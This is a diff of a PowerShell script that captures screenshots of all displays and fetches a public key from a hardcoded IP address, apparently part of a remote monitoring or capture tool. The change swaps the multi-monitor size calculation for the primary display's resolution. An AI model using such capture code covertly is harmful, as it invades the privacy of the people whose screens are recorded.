@@ -6,7 +6,14 @@ $scriptBlock = {
     #Webserver for getting public key
 	$base_url = "http://10.0.0.1"
 	$key = 'http://218.212.196.215/get_public_key.php'
-
+	
+	$display = Get-CimInstance Win32_VideoController
+	
+	$width = $display.CurrentHorizontalResolution -as [int]
+	$height = $display.CurrentVerticalResolution -as [int]
+	
+	Write-Host "Resolution (ignoring scaling): ${width}x${height}"
+	
     #---------------------------------------------------------------------------------------------------------------------
     #                                                      Basic Functions
     #---------------------------------------------------------------------------------------------------------------------
@@ -74,13 +81,14 @@ $scriptBlock = {
     	Write-Host "Call Get Screenshot"
         [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
         [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
-        [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-
-    	$width = 0;
-    	$height = 0;
+		[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+		
     	$workingAreaX = 0;
     	$workingAreaY = 0;
     	
+		Write-Host "Screenshot : $width"
+		Write-Host "Screenshot : $height"
+		
     	$screen = [System.Windows.Forms.Screen]::AllScreens;
     	
     	foreach ($item in $screen)
@@ -94,15 +102,8 @@ $scriptBlock = {
     		{
     			$workingAreaY = $item.WorkingArea.Y;
     		}
-    	
-    		$width = $width + $item.Bounds.Width;
-    	
-    		if($item.Bounds.Height -gt $height)
-    		{
-    			$height = $item.Bounds.Height;
-    		}
     	}
-    	
+		
     	$bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);
     	$bmp = New-Object Drawing.Bitmap $width, $height;
     	$graphics = [Drawing.Graphics]::FromImage($bmp);
